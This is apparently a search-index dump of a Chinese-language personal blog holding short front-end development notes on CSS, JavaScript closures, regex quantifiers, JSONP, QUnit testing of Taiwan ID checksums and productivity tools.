在此筆記:D pointer-events: none; 就這麼簡單 至於羽毛特效之後在分悉怎麼用的(pixi.js) http://blog.aquaring.co.jp/517 參考來源： 穿透的 div ( pointer-events ) http://www.oxxostudio.tw/articles/201409/pointer-events.html pointer-events https://developer.mozilla.org/zh-TW/docs/Web/CSS/pointer-events?v=control ","date":"2017-05-22","objectID":"/blog/posts/logdown/2017-05-22-css-does-not-touch-the-pointer-events-property/:0:0","tags":["CSS","pointer-events"],"title":"[CSS]看的到確摸不到的pointer-events屬性","uri":"/blog/posts/logdown/2017-05-22-css-does-not-touch-the-pointer-events-property/"},{"categories":["網頁特效"],"content":"好久沒有分析網頁特效了 前篇都不知道過多少年了XD 最近有看到幾個07月新番網站還不錯來筆記一下 http://colopl.co.jp/battlegirl-hs/anime/ 這個特效還不錯的，本來想看一下怎麼使用 \u003cdiv style=\"animation-duration: 800ms;\" class=\"animsition-overlay-slide overlay-slide-in-bottom\"\u003e\u003c/div\u003e 一找還發現有現程寫好的套件可以使用 http://git.blivesta.com/animsition/ 官網還有很多套件 http://www.blivesta.com/ https://github.com/blivesta/ 還滿簡單 ","date":"2017-05-21","objectID":"/blog/posts/logdown/2017-05-21-1862646/:0:0","tags":null,"title":"用animsition製作閃動網站特效記錄","uri":"/blog/posts/logdown/2017-05-21-1862646/"},{"categories":["JavaScript"],"content":"遇到一個雷…，記錄一下 var a = -1; if(a){ echo 'hello world'; } denysdovhan/wtfjs: A list of funny and tricky JavaScript examples wtf.js ","date":"2017-05-15","objectID":"/blog/posts/logdown/2017-05-15-1840469/:0:0","tags":null,"title":"[javascript]if(-1)  結果","uri":"/blog/posts/logdown/2017-05-15-1840469/"},{"categories":["CSS"],"content":"今天做自我介紹排版練習 我以前學position:absolute 印象以為都以瀏覽器body:左上邊開使算(在沒用 position: relative情況下) 但今天做巢狀position:absolute ，排版跟我想排出來的不太一樣 在此做筆記 錯誤的東西吸收很難再做修正 在此記錄一些東西，可以回來復習 資料來源： html - Positioning a nested DIV relative to the page and not the first positioned ancestor - Stack Overflow http://stackoverflow.com/questions/36778547/positioning-a-nested-div-relative-to-the-page-and-not-the-first-positioned-ances JS Bin - Collaborative JavaScript Debugging http://jsbin.com/jaqogezane/edit?html,css,output html css基础篇 - 笔记 - 前端网（QDFuns） http://www.qdfuns.com/notes.php?mod=view\u0026u=25414\u0026id=f9d7d2e2e25c2bef1eca4db2ed00bae0 实例演示div+css的绝对定位和相对定位布局 - - ITeye技术网站 http://xinklabi.iteye.com/blog/1825865 实例演示div+css的绝对定位和相对定位 - CSS3知识库 http://lib.csdn.net/article/css3/51716 知识库 - 你身边的技术百科全书 - CSDN http://lib.csdn.net/home CSS3 技能圖 http://lib.csdn.net/base/css3/structure 知识库 - 你身边的技术百科全书 - CSDN http://lib.csdn.net/bases/fd/Software-Develop/ast/frontend#md CSS3知识库 - 知识库 - 你身边的技术百科全书 - CSDN http://lib.csdn.net/base/css3 AngularJS知识库 - 知识库 - 你身边的技术百科全书 - CSDN http://lib.csdn.net/base/angularjs CSDN.NET - 全球最大中文IT社区，为IT专业技术人员提供最全面的信息传播和服务平台 http://www.csdn.net/?ref=toolbar ","date":"2017-05-12","objectID":"/blog/posts/logdown/2017-05-12-css-erroneous-notions-that-i-positionabsolute/:0:0","tags":["CSS","position"],"title":"[CSS] 我的錯誤觀念position:absolute","uri":"/blog/posts/logdown/2017-05-12-css-erroneous-notions-that-i-positionabsolute/"},{"categories":["JavaScript"],"content":" var obj = { foo: function() { /* code */ }, bar: function() { /* code */ } }; var obj = { foo() { /* code */ }, bar() { /* code */ } }; https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Method_definitions ","date":"2017-05-04","objectID":"/blog/posts/logdown/2017-05-04-1790922/:0:0","tags":["JavaScript","Method definitions"],"title":"[JavaScript]Method definitions(js物件裡function縮寫)","uri":"/blog/posts/logdown/2017-05-04-1790922/"},{"categories":["CSS"],"content":"採到雷 thead, tbody, tfoot { vertical-align: middle } td, th, tr { vertical-align: inherit } http://stackoverflow.com/questions/33487148/default-value-of-vertical-align-for-table-cells https://www.w3.org/TR/CSS2/sample.html ","date":"2017-05-02","objectID":"/blog/posts/logdown/2017-05-02-1784726/:0:0","tags":["CSS","vertical-align"],"title":"[CSS]table td預設是vertical-align: middle???","uri":"/blog/posts/logdown/2017-05-02-1784726/"},{"categories":["JavaScript"],"content":"最近幫新進同事看code，因為帶他的人是使用JavaScript 原本想說盡量使用動態抓取，後來不知道原生怎麼寫 結果還是使用 $('#table').find(' tr').size() 想說JavaScript應該也是有抓法才對 就上網找了一下資訊 原本以為可以Document.getElementById(‘id’).getElementsByName(‘xxxx’) 結果是我錯了orz document.getElementById(“intro”); document.getElementsByName() Element.getElementsByClassName() Element.getElementsByTagName() \u003cform name='form1_name' id='form1_id'\u003e \u003c/form\u003e document.form1_name; document.forms[‘form1_id’] document https://www.w3schools.com/js/js_htmldom_elements.asp 參考來源： JavaScript DOM Elements https://www.w3schools.com/js/js_htmldom_elements.asp document.getElementsByClassName https://www.w3schools.com/js/js_htmldom_elements.asp Element - Web APIs | MDN https://developer.mozilla.org/zh-TW/docs/Web/API/Element What’s the point of HTML forms name attribute? - Stack Overflow http://stackoverflow.com/questions/8946320/whats-the-point-of-html-forms-name-attribute Element.name - Web APIs | MDN https://developer.mozilla.org/en-US/docs/Web/API/Element/name DOM Version https://www.w3schools.com/jsref/coll_doc_forms.asp DOM概述 - Web API 接口 | MDN https://developer.mozilla.org/zh-CN/docs/Web/API/Document_Object_Model/Introduction .form1DOM Level http://blog.xuite.net/abgne/diary1/5896789-%E5%8F%96%E5%BE%97+HTML+%E4%B8%AD%E7%9A%84%E5%85%83%E7%B4%A0 DOM Level 要了解嗎 - Google 搜尋 https://www.google.com.tw/search?q=DOM+Level+%E8%A6%81%E4%BA%86%E8%A7%A3%E5%97%8E\u0026ei=jzcHWcCgIcW10ATyk7-YAw\u0026start=10\u0026sa=N\u0026biw=1600\u0026bih=809 JavaScript浏览器对象——表单（Form） http://www.monmonkey.com/javascript/liulanqi8.html ","date":"2017-05-01","objectID":"/blog/posts/logdown/2017-05-01-1780467/:0:0","tags":["JavaScript","getElementsByClassName"],"title":"[JavaScript]JavaScript原生的找子元素(getElementsByClassName)","uri":"/blog/posts/logdown/2017-05-01-1780467/"},{"categories":["Regex"],"content":"前幾天在老闆 來點寇汀吧。 Boss,CODING please.製作台灣天氣地圖 看到使用正規化抓取href=\".*?“裡面的值 在此學會新的正規化抓取href裡面值 Google找到相關文件 在此記錄筆記 +——————-+—————–+—————————+ | Greedy quantifier | Lazy quantifier | Description | +——————-+—————–+—————————+ | * | *? | Match zero or more times. | | + | +? | Match one or more times. | | ? | ?? | Match zero or one time. | | {n} | {n}? | Match exactly n times. | | {n,} | {n,}? | Match at least n times. | | {n,m} | {n,m}? | Match from n to m times. | +——————-+—————–+—————————+ 在這邊有找到兩個名詞 原本看不懂這兩個意思 不過在這裡面有找到答案一名之立，旬月踟躇 正在翻譯《精通正則表達式》，就遇到了這種情況：greedy quantifier控制的子表達式會捕獲儘可能多的匹配字符，lazy quantifier控制的子表達式會捕獲儘可能少的匹配字符。greedy的原意就是「貪婪」，lazy的原意就是「懶惰」，這樣直白地理解，儘管有些彆扭，倒也不成問題。 可是，出現greedy和lazy的語境越來越多，直白的翻譯也就越來越不讓人滿意了，「Because of its greediness」，翻譯成「由於它的貪婪性」，簡直無法卒讀。但是，想來想去，實在找不到更好的辦法，總是被「貪」和「懶」兩個字所束縛，這些天，兩本厚厚的英漢詞典，和現代漢語詞典，都快翻盡了，仍然一無所獲。 終於在下班的路上想到，不妨另闢蹊徑，索性不出現「貪」和「懶」——greedy翻譯成「多數優先」，lazy翻譯成「少數優先」，反而流暢許多；而且，這樣一來，也不用「性」來「性」去的了，「Because of its greediness」直接翻譯成「因為它是多數優先的」，就OK。 結論 這個特性真的不錯，平常href=”[^\"]+“抓取括號的字，這樣非常簡短。Quantifier在後面加?找最短路徑這樣非常好記 學這個小東西，相信regex技能又前進一大步XD 參考來源 Rubular: a Ruby regular expression editor and tester http://www.rubular.com/ railroad diagram https://blog.longwin.com.tw/2013/01/regex-display-tool-2012/ Railroad Diagrams https://regexper.com/documentation.html Quantifiers http://www.rexegg.com/regex-quickstart.html regex - What do lazy and greedy mean in the context of regular expressions? - Stack Overflow http://stackoverflow.com/questions/2301285/what-do-lazy-and-greedy-mean-in-the-context-of-regular-expressions Logdown https://logdown.com/account/posts/1774877/edit [正則表示式 正規表示式 (Regular expression)] 量符(Quantifier)：貪心量符、惰性量符的介紹 http://notepad.yehyeh.net/Content/Program/RegularExpression/8.php Regex Quantifier Tutorial: Greedy, Lazy, Possessive http://www.rexegg.com/regex-quantifiers.html#cheat_sheet Regexper https://regexper.com/#href%3D%22(.*%3F)%22 乱象，印迹 » 一名之立，旬月踟躇 http://www.luanxiang.org/blog/archives/36.html Greedy quantifier http://stackoverflow.com/questions/2301285/what-do-lazy-and-greedy-mean-in-the-context-of-regular-expressions Quantifiers in Regular - Google 搜尋 https://www.google.com.tw/search?q=Quantifiers+in+Regular\u0026source=lnt\u0026tbs=lr:lang_1zh-CN%7Clang_1zh-TW\u0026lr=lang_zh-CN%7Clang_zh-TW\u0026sa=X\u0026ved=0ahUKEwiAm6WGpsvTAhXCHJQKHVa7Dm0QpwUIHQ\u0026biw=1600\u0026bih=809 ","date":"2017-04-30","objectID":"/blog/posts/logdown/2017-04-30-1774877/:0:0","tags":["regex","Greedy quantifier","Lazy quantifier"],"title":"[regex]Greedy quantifier 和 Lazy quantifier 筆記","uri":"/blog/posts/logdown/2017-04-30-1774877/"},{"categories":["CSS"],"content":"前幾天有用到CSS ~，一直以為跟jQuery的$().siblings()是一樣的東西。 結果不是 在此記錄一下 CSS element1+element2 抓取element1下一個element2元素 element1~element2 抓取element1之後element2元素 [attribute] [attribute~=value] [attribute|=value] https://www.w3schools.com/cssref/sel_attribute_value_lang.asp 不知道怎麼解譯= =a [attribute^=value] [attribute$=value] [attribute*=value] :empty 抓取標籤無任何東西 ::first-letter ::first-line :first-of-type :in-range input 在range內 :invalid 抓取input驗證type屬性不對 :lang(language) :nth-child(n) :nth-last-child(n) :nth-last-of-type(n) :nth-of-type(n) :target 網址#abc，會對印抓取id=abc jQuery也有此function —–下面沒有支援jQuery Selector :optional 非必填的input :out-of-range input超出 range ","date":"2017-04-29","objectID":"/blog/posts/logdown/2017-04-29-1767277/:0:0","tags":["CSS","Selectors"],"title":"[CSS] 不常用的CSS Selectors筆記","uri":"/blog/posts/logdown/2017-04-29-1767277/"},{"categories":["CSS"],"content":":read-only :read-write ::selection 選取文字的顏色 jQuery (CSS Selector沒有) 整理完才發現這麼多 囧 :visible Selector :text Selector :target Selector :selected Selector :submit Selector :parent Selector :password Selector :lt() Selector :last Selector :input Selector :image Selector :hidden Selector :header Selector h1,h2,h3,h4,h5 :has() Selector :first Selector :even Selector :contains() Selector :animated Selector ","date":"2017-04-29","objectID":"/blog/posts/logdown/2017-04-29-1767277/:1:0","tags":["CSS","Selectors"],"title":"[CSS] 不常用的CSS Selectors筆記","uri":"/blog/posts/logdown/2017-04-29-1767277/"},{"categories":["Markdown"],"content":"http://www.williamlong.info/archives/4319.html ","date":"2017-04-21","objectID":"/blog/posts/logdown/2017-04-21-1731370/:0:0","tags":null,"title":"Markdown 編輯器","uri":"/blog/posts/logdown/2017-04-21-1731370/"},{"categories":["JavaScript"],"content":"前幾天在hahow上 動畫互動網頁程式入門 (HTML/CSS/JS) 這沒有要打廣告，不過老師真的教得不錯 看到講師上到實作購物車時候 其中某一個function利用多個(json)物件組出list清單 而新增、刪除都是對物件操作，再透過function把list清單清空再繪製 ！！！！這看起來有問題，講師怎麼這樣做，這項目很多時，捲軸會有問題，這一定有bug 不過還是簡單做一個小實驗好了， http://jsbin.com/fucoxur/edit?html,css,js,console,output 結果 怎麼想都想不到原因，就求救FB社群大大求救 https://www.facebook.com/groups/f2e.tw/permalink/1271697796200916/ 原本網頁渲染的過程 (rendering pipline) 會先執行 js 然後看 dom 跟 cssom 做成 render tree 然後畫在畫面上，你原先的作法等於 dom 被修改了兩次之後瀏覽器才開始跑剩餘的 rendering pipline 的流程 所以會依最後一次的結果 dom 的結果呈現 然而你讀取 scrolltop 的屬性的時候 網頁會 reflow 算出 scrolltop 的值，這時瀏覽器就會被強迫進行一次繪製，就會有你原本預期的行為 reflow不知道還有什麼情境，還能運用這個技巧，先記個筆記，怕忘記XD 參考來源 https://developers.google.com/web/fundamentals/performance/rendering/ https://gist.github.com/paulirish/5d52fb081b3570c81e3a inspiregate.windspeaker.co/post/3959-the-browser-39-s-rendering-principle ","date":"2017-04-21","objectID":"/blog/posts/logdown/2017-04-21-javascript-web-page-rendering-rendering-pipline/:0:0","tags":["JavaScript","網頁渲染","rendering pipline"],"title":"[JavaScript] 網頁渲染的過程 (rendering pipline)","uri":"/blog/posts/logdown/2017-04-21-javascript-web-page-rendering-rendering-pipline/"},{"categories":["CSS"],"content":"http://jsbin.com/hapineqoca/edit?css,output ","date":"2017-04-11","objectID":"/blog/posts/logdown/2017-04-11-css-checkbox-hack-simulation-in-a-page-window/:0:0","tags":["CSS","checkbox hack"],"title":"[CSS] checkbox hack 模擬在網頁開視窗","uri":"/blog/posts/logdown/2017-04-11-css-checkbox-hack-simulation-in-a-page-window/"},{"categories":["CSS"],"content":"http://geekplux.com/2014/03/14/collapsing_margins.html 垂直 https://read01.com/gm0eN.html css - Margin collapse on inline-block elements? - Stack Overflow http://stackoverflow.com/questions/25455932/margin-collapse-on-inline-block-elements collapsed margin http://geekplux.com/2014/03/14/collapsing_margins.html inline-block不會有影響 block只影響上下，左右不會 先記錄先 ","date":"2017-03-25","objectID":"/blog/posts/logdown/2017-03-25-1640745/:0:0","tags":["margin","CSS"],"title":"[CSS] margin 排版問題(Collapsing margins)","uri":"/blog/posts/logdown/2017-03-25-1640745/"},{"categories":["CSS"],"content":"最近在公司發現排版有問題，出現不該出現的捲軸 CSS原本以為是width:100%，應該調一下box-sizing :border-sizing 結果還是一樣有問題…. 後來發現auto，就不會有問題 不過當然要思考這兩個屬性差異 之後我認為width 沒設就是100% 但後來Google一下，發現我錯了，預設是auto (我也以為auto也是100%) ‘margin-left’ + ‘border-left-width’ + ‘padding-left’ + ‘width’ + ‘padding-right’ + ‘border-right-width’ + ‘margin-right’ = width of containing block http://www.456bereastreet.com/archive/201112/the_difference_between_widthauto_and_width100/ 身為英文苦手不知道寫什麼意思，後來有爬到中文文章 内容的寬度=‘margin-left’ + ‘border-left-width’ + ‘padding-left’ + ‘width’ + ‘padding-right’ + ‘border-right-width’ + ‘margin-right’ 如果’margin-left’ + ‘border-left-width’ + ‘padding-left’ + ‘padding-right’ + ‘border-right-width’ + ‘margin-right’比較大，就減小width的值，如果比較小呢，就增大width的值，使其滿足上面的表達式。 http://m.studyofnet.com/news/965.html 總結一下，上面意思就是width:auto後，寬度算法會'margin-left' + 'border-left-width' + 'padding-left' + 'padding-right' + 'border-right-width' + 'margin-right' \u003ewidth，就會自動縮減width寬度；'margin-left' + 'border-left-width' + 'padding-left' + 'padding-right' + 'border-right-width' + 'margin-right' \u003cwidth，就會自動增加width寬度 簡單就是width:auto，不會備padding影響 正常情行應該選用width:auto比較不會有排版的問題 參考來源： http://www.456bereastreet.com/archive/201112/the_difference_between_widthauto_and_width100/ http://m.studyofnet.com/news/965.html Visual formatting model details https://www.w3.org/TR/CSS21/visudet.html#inline-replaced-width ","date":"2017-03-25","objectID":"/blog/posts/logdown/2017-03-25-1640260/:0:0","tags":["CSS","width"],"title":"[CSS]width:auto不等於100%","uri":"/blog/posts/logdown/2017-03-25-1640260/"},{"categories":["JavaScript"],"content":"整個就悲劇。 ","date":"2017-03-10","objectID":"/blog/posts/logdown/2017-03-10-javascript-ie-w3c-event-uses-different/:0:0","tags":null,"title":"[JavaScript] IE/W3C Event用法大不同","uri":"/blog/posts/logdown/2017-03-10-javascript-ie-w3c-event-uses-different/"},{"categories":["HTML"],"content":"dd裡面不能放入dd標籤 用了一整天的畫面問題 在找漏掉結尾的html tag 結果…採到這個雷 囧 ","date":"2017-02-23","objectID":"/blog/posts/logdown/2017-02-23-1458104/:0:0","tags":["HTML","dd"],"title":"[HTML]dd 裡面不能故放入dd標籤","uri":"/blog/posts/logdown/2017-02-23-1458104/"},{"categories":["JavaScript"],"content":"為什麼JSONP不能使用POST? 因為JSONP透過script標籤實作 所以才沒辦法做 就這樣:) 參考來源: How to use type: “POST” in jsonp ajax call http://stackoverflow.com/questions/4508198/how-to-use-type-post-in-jsonp-ajax-call 使用 JSONP 跨站請求 http://openhome.cc/Gossip/JavaScript/JSONP.html ","date":"2016-12-26","objectID":"/blog/posts/logdown/2016-12-26-1246428/:0:0","tags":["JavaScript","JSONP"],"title":"[JavaScript]JSONP為什麼不能用POST","uri":"/blog/posts/logdown/2016-12-26-1246428/"},{"categories":["JavaScript"],"content":"很久之前，有看過JSONP文章，雖然有看一下實作原理都懂，但沒有動手做實作 前幾天看到有人討論JSONP不能用POST方法去做 這就讓我非常好奇是怎麼一回事 首先， 先從網路找一份PHP做JSONP範例 \u003c?php $fname = $_GET['firstname']; echo $_GET['callback'] . '(' . \"{'fullname' : 'Jeff Hansen'}\" . ')'; ?\u003e 前端就先用jQuery AJAX實作吧 只不過…我真的不太熟 一開始就碰壁，不多說馬上筆記 我很懶，在jQuery官網在開發工具做測試 只不過…一直沒成功，讓我好懊腦 看開發工具好像寫https關係 https://developer.mozilla.org/zh-TW/docs/Security/MixedContent?utm_campaign=default\u0026utm_medium=firefox-console-errors\u0026utm_source=mozilla 在http就正常了 $.ajax({ type: \"get\", url: \"http://10.10.1.132/testJsonp.php?callback=?\u0026firstname=Jefssf\", dataType: \"jsonp\", //json: 'callback', //jsonpCallback: 'abc',//\"mycallback\"變數的值，沒指定時，jQuery隨機產生 success: function(res){ console.log(res); }, error: function(){ alert('fail'); } }); http://10.10.1.132/testJsonp.php?callback=jQuery1113042020808678791977_1482680736926\u0026firstname=Jefssf\u0026_=1482680736939 上面網址callback沒有指定的話，產生出來自動為亂數 ajax裡的參數 jsonp為 xxx=? 參數命名 jsonpCallback=傳回來function命名 ，xxx=?參數，沒指定callback產生出來自動為亂數 至於JSONP為什麼不能用POST，下次再做探討。 相關資料 JSONP跨網域傳送檔案：以POST方法實作 - 布丁布丁吃什麼？ http://blog.pulipuli.info/2011/05/jsonppost.html Simple jQuery, PHP and JSONP example? - Stack Overflow http://stackoverflow.com/questions/6809053/simple-jquery-php-and-jsonp-example jQuery.ajax() | jQuery API Documentation http://api.jquery.com/jQuery.ajax/ success_jsonpCallback http://www.cnblogs.com/know/archive/2011/10/09/2204005.html Working with JSONP | jQuery Learning Center http://learn.jquery.com/ajax/working-with-jsonp/ 混和內容 - Security | MDN https://developer.mozilla.org/zh-TW/docs/Security/MixedContent?utm_campaign=default\u0026utm_medium=firefox-console-errors\u0026utm_source=mozilla cross http://www.css88.com/jqapi-1.9/jQuery.ajax/ Attribute Ends With Selector [name$=“value”] | jQuery API中文文档(适用jQuery 1.0 - jQuery 3.0) http://www.css88.com/jqapi-1.9/attribute-ends-with-selector/ 使用 JSONP 跨站請求 http://openhome.cc/Gossip/JavaScript/JSONP.html ","date":"2016-12-25","objectID":"/blog/posts/logdown/2016-12-25-javascript-jsonp-fruit/:0:0","tags":["JSONP","JavaScript"],"title":"[JavaScript] JSONP 小實作","uri":"/blog/posts/logdown/2016-12-25-javascript-jsonp-fruit/"},{"categories":["JavaScript"],"content":"最近copy到公司身份證驗證程式有問題 好險是上線前發現 今天就簡單用測試程式寫了QUNIT測試程式 \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003clink href=\"https://code.jquery.com/qunit/qunit-git.css\" rel=\"stylesheet\" type=\"text/css\" /\u003e \u003cscript src=\"https://code.jquery.com/qunit/qunit-git.js\"\u003e\u003c/script\u003e \u003cmeta charset=\"utf-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width\"\u003e \u003ctitle\u003eJS Bin\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv id=\"qunit\"\u003e\u003c/div\u003e \u003cdiv id=\"qunit-fixture\"\u003e\u003c/div\u003e \u003c/body\u003e \u003c/html\u003e \u003cscript\u003e QUnit.module('測試身份證'); function getTwID(){ //建立字母分數陣列(A~Z) var city = new Array( 1,10,19,28,37,46,55,64,39,73,82, 2,11, 20,48,29,38,47,56,65,74,83,21, 3,12,30 ) //建立隨機身份證碼 var id = new Array(); id[0] = String.fromCharCode(Math.floor(Math.random() * (26)) + 65); id[1] = Math.floor(Math.random() * (2)) + 1; for(var i=2; i\u003c9; i++){ id[i] = Math.floor(Math.random() * (9)) + 0; } //計算總分 var total = city[id[0].charCodeAt(0)-65]; for(var i=1; i\u003c=8; i++){ total += eval(id[i]) * (9 - i); } //計算最尾碼 var total_arr = (total+'').split(''); var lastChar = eval(10-total_arr[total_arr.length-1]); var lastChar_arr = (lastChar+'').split(''); //補上最後檢查碼 id[id.length++] = lastChar_arr[lastChar_arr.length-1]; //回傳結果 return id.join(''); } function checkTwID(id){ //建立字母分數陣列(A~Z) var city = new Array( 1,10,19,28,37,46,55,64,39,73,82, 2,11, 20,48,29,38,47,56,65,74,83,21, 3,12,30 ) id = id.toUpperCase(); // 使用「正規表達式」檢驗格式 if (id.search(/^[A-Z](1|2)\\d{8}$/i) == -1) { alert('基本格式錯誤'); return false; } else { //將字串分割為陣列(IE必需這麼做才不會出錯) id = id.split(''); //計算總分 var total = city[id[0].charCodeAt(0)-65]; for(var i=1; i\u003c=8; i++){ total += eval(id[i]) * (9 - i); } //補上檢查碼(最後一碼) total += eval(id[9]); //檢查比對碼(餘數應為0); return ((total%10 == 0 )); } } var chartId_list = []; for(var i = 0; i \u003c 1000;i++){ chartId_list.push(getTwID()); } //遇到動態產生錯誤問題，解決方法 //http://stackoverflow.com/questions/36021953/qunit-test-in-loop-index-always-the-same for(let i = 0; i \u003c 1000; i++){ QUnit.test( \"驗證ID:\" + chartId_list[i], function( assert ) { assert.ok( checkTwID(chartId_list[i]), \" 網路方法 Passed!\" ); }); } \u003c/script\u003e #備忘錄 之前動態產生測試會有問題 有想用閉包解決，但沒有想到怎麼用 x.x 最後還是靠stackoverflow查到 果然我還需要磨練阿~~~~ ","date":"2016-12-02","objectID":"/blog/posts/logdown/2016-12-02-1163133/:0:0","tags":["test","Qunit"],"title":"用Qunit驗證身份證","uri":"/blog/posts/logdown/2016-12-02-1163133/"},{"categories":["實用工具"],"content":"前幾天看到無痛爬梳自己來，用 Google Spreadsheet 爬取網頁資料 就想之前的Kimono 但現在官網要收掉這個服務 不過有官網友留下kimono desktop edition 離線版程式使用(只有MAC和Windows) 目前不知道有沒有辦法移植到Linux上面玩 kimonolabs.com kimono for desktop Create APIs with Chrome Ext v Create APIs with Bookmarklet v v Manage and configure APIs v v Run APIs manually v Run APIs on a schedule v Cloud hosted API endpoints v (w/ Firebase) Crawling \u0026 Pagination v v Get data behind a login v v Kimono Apps / Blocks v Google sheets integration v Webhooks \u0026 Email alerts v Save scraped data to file v v CSV \u0026 RSS output v v 當然離線版沒有這麼多功能，可惜沒有排程可以用 但發現他程式透過NodeJS去寫，好像可以透過API方式去實作 在此先記錄一下筆記 首先，安裝kimono desktop edition 和chrome extension 相關套件網路就一堆，我就先偷懶拉o.\u003c 不會寫程式也能爬，Kimono 幫你把網站變資料 API建立好，開kimono desktop edition可以看到剛剛家加入的任務 按下Start Crawl 可執行爬蟲 後來我發現kimono desktop edition可以開啟開發者工具 發現執行Web API可以跑爬蟲 看來排程執行爬蟲指日可待XD POST /ws/startcrawl/ HTTP/1.1 Host: localhost:3000 Origin: http://localhost:3000 X-DevTools-Emulate-Network-Conditions-Client-Id: 93A1E1D6-2642-4DD4-84B2-5BAE0E75261C User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) kimono-desktop/1.0.5 Chrome/45.0.2454.85 Electron/0.35.4 Safari/537.36 Content-Type: application/json;charset=UTF-8 Referer: http://localhost:3000/apis/b8ed4oy2 Accept-Encoding: gzip, deflate Accept-Language: zh-TW Cache-Control: no-cache Postman-Token: 0b770020-6467-cff2-5923-6300dc330def {\"apiid\":\"b8ed4oy2\"} 看爬蟲API任務的狀態WEB API ","date":"2016-11-27","objectID":"/blog/posts/logdown/2016-11-27-1147900/:0:0","tags":["爬蟲","Kimono"],"title":"不用程式寫爬蟲記錄(Kimono Desktop)","uri":"/blog/posts/logdown/2016-11-27-1147900/"},{"categories":["JavaScript"],"content":"之前看JavaScript閉包文章都看不懂，前陣子買了FB社群推薦的「忍者JavaScript開發技巧探秘」 最近先跳著看到閉包單元，有了解一點東西跟以前錯誤的觀念，就先來這邊做一下筆記。 免得之後全部忘光光了XD 首先，前面介紹每個function都是閉包(我驚呆了) 我這邊就先舉例範例 var value = 'hello world' function a1(){ console.log(value) // print hello world } 相信大家都知道這一定會顯示hello world吧 但我覺得大家都會不太清楚這是閉包 以下是我記錯當時錯誤觀念 前陣子，跟同事討論這個問題，他認為JavaScript在function外面就是全域變數 所以值也會抓到。 我認為是因為當function沒有宣告變數，會自動抓取window.value 不過跟我同事一樣，也是全域變數觀念。 以前有看到在瀏覽器沒有下var變數，變數會寫在window物件上 我以為同理可證跟function一模一樣，但測試結果也是這樣 以前，看JavaScript大全完全看不懂閉包這單元 今天終於開竅了。 簡單來講閉包就是function抓取變數，先從function內抓取變數，假如function內沒變數，會從外面抓取變數 他有著call by reference觀念 詳細：http://eddychang.me/blog/javascript/84-js-clousure.html 上面網站圖片和內容寫得還滿清楚的 好了，再來進入番外篇 JavaScript怎麼會有call by reference 我一直以為JavaScript都是call by value 好險，看到上面這個文章 JavaScript有一個形態是call by reference 就是Object物件就是call by reference var obj = {a:1} function a(value){ value.a=3; } a(obj); console.log(obj); // print Object {a:3} 以前好在沒有採到這個雷，下次應該不會踩到XD 然後，接下來突然想到以前看不懂的閉包文章 \u003cp id=\"help\"\u003eHelpful notes will appear here\u003c/p\u003e \u003cp\u003eE-mail: \u003cinput type=\"text\" id=\"email\" name=\"email\"\u003e\u003c/p\u003e \u003cp\u003eName: \u003cinput type=\"text\" id=\"name\" name=\"name\"\u003e\u003c/p\u003e \u003cp\u003eAge: \u003cinput type=\"text\" id=\"age\" name=\"age\"\u003e\u003c/p\u003e function showHelp(help) { document.getElementById('help').innerHTML = help; } function setupHelp() { var helpText = [ {'id': 'email', 'help': 'Your e-mail address'}, {'id': 'name', 'help': 'Your full name'}, {'id': 'age', 'help': 'Your age (you must be over 16)'} ]; for (var i = 0; i \u003c helpText.length; i++) { var item = helpText[i]; document.getElementById(item.id).onfocus = function() { showHelp(item.help); } } } setupHelp(); 這下能理解item.help為什麼抓到都是helpText最後面一個 因為每個迴圈實做閉包 但是setupHelp()跑完item變數就會存在於閉包，不會消失(但外在function沒法存取這個變數) 所以每個onfocus都會跑出Your age (you must be over 16 了解過去不了解的東西，可喜可賀^o^ 再來，番外篇2 文章上面有寫let可以解決閉包範例 所以就爬文一下 let好像類似Java變數生活周期是在{}結束 上述只是猜測 var a = 2; if(a==2){ let a = 1 console.log(a); // print 1 } console.log(a); // print 2 有空深入了解 聽說閉包是JavaScript精華，目前提到的東西可能還算閉包最基礎的東西 像scope chain、匿名函式……都還沒研究。 等了解後再記錄筆記吧 參考： 《你不知道的JavaScript》整理（一）——作用域、提升與閉包 - 每日頭條 https://kknews.cc/other/6bmzqq.html 闭包 - JavaScript | MDN https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Closures#Creating_closures_in_loops_A_common_mistake Javascript 閉包 Closure « Guang’s Note http://guang.logdown.com/posts/277383-javascript-closure JavaScript筆記: function is call by “value” or call by “reference”? « 弱弱前端碎碎念 http://heyyou.logdown.com/posts/145054 Tag : javascript « 弱弱前端碎碎念 http://heyyou.logdown.com/tags/javascript 從ES6開始的JavaScript學習生活 · GitBook https://www.gitbook.com/book/eyesofkids/javascript-start-from-es6/details refer http://eddychang.me/blog/javascript/84-js-clousure.html 深入理解什麼是javascript中的閉包。_StackDoc http://fanli7.net/a/caozuoxitong/OS/20110830/125313.html let https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Statements/let#let_%E7%9A%84%E4%BD%9C%E7%94%A8%E5%8D%80%E5%A1%8A ","date":"2016-10-02","objectID":"/blog/posts/logdown/2016-10-02-javascript-closure-note/:0:0","tags":["閉包","JavaScript","reference"],"title":"[JavaScript]閉包筆記記錄","uri":"/blog/posts/logdown/2016-10-02-javascript-closure-note/"},{"categories":["實用工具"],"content":"最近公司專案是用西班牙語 所以要一直參考文件貼到別的地方 一直複製 → 貼上 →複製 → 貼上→複製 → 貼上→複製 → 貼上→複製 → 貼上→複製 → 貼上… 無限迴圈 之前一些都靠Sublime Text還hold的住 現在就有點麻煩，速度感覺有變慢 就想以前有看到剪貼簿工具 但覺得用不太到… 現在發現還滿好用的 目前有試用Ditto、HamsinClipboard Ditto是免費開源軟體 Ctrl+` 可呼叫清單 沒有次數限制 *但沒有強力貼上功能 HamsinClipboard 比較喜歡他的Incremental paste 就是可以複製 → 複製→複製→複製→複製 → 貼上→貼上 → 貼上→ 貼上→ 貼上 可惜…有十個限制 但還是能加減用XD ClipX好像win7 64bit換閃退 ClipMate 聽說這邊更強… 但他並非免費軟體，這邊我就不介紹了 他的順序粘貼（Incremental paste）真的是最簡單又好用 Firefox Easy Copy 大量開分頁複製Tittle和URL需要大量時間 所以每次隨意筆記都要花一堆時間 現在Easy Copy 套件能解決我的問題 但好像沒辦法做到換行… 沒關係，Sublime Text hold的住XD 參考來源 